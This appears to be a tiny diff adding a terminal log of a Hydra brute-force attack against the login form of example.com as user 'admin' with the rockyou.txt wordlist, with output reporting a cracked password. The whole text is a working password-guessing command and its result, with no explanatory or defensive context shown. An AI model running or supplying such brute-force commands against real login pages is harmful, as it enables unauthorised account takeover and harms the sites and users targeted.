@@ -1,0 +1,5 @@
+$ hydra -l admin -P rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+HOST          LOGIN   PASSWORD
+example.com   admin   Summer2026!
+[STATUS] attack finished for example.com
+1 valid password found
